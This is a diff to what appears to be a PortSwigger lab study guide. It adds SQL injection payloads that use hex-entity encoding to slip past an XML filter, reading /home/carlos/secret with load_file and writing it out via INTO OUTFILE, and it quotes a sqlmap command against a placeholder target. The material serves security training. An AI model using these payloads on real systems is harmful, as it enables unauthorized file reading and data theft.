@@ -441,7 +441,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 >SQL injection with filter bypass via XML encoding may allow extract of sensitive data.  
 
->Identify by using mathematical expresion such as **7x7**, and this indicate possible SQL injection or Template injections.
+>Identify injection point by using mathematical expression such as **7x7**, and this indicate possible SQL injection or Template injections.
 
 ![identify-math-evaluated-xml](identify-math-evaluated-xml.png)  
 
@@ -462,6 +462,14 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 ```  
 
 !(SQL injection with filter bypass via XML encoding obfuscation)[xml+sql+obfuscation.png]
+
+>SQLi Payloads to read local file, and or output to another folder on target.  
+
+```sql
+<@hex_entities>1 UNION all select load_file('/home/carlos/secret')<@/hex_entities>  
+
+<@hex_entities>1 UNION all select load_file('/home/carlos/secret') into outfile '/tmp/secret'<@/hex_entities>
+```  
 
 [PortSwigger Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)  
 
